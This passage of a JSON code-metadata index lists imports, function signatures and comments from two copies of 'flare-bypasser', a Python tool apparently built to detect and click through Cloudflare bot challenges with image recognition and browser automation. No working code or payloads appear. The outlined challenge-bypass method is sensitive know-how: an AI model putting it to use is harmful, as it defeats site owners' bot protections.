          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser",
    "name": "flare_bypasser",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .flare_bypass_server import *"
        ],
        "comments": [
          "# We can't get package version metadata inside Docker since package is not installed."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare_bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
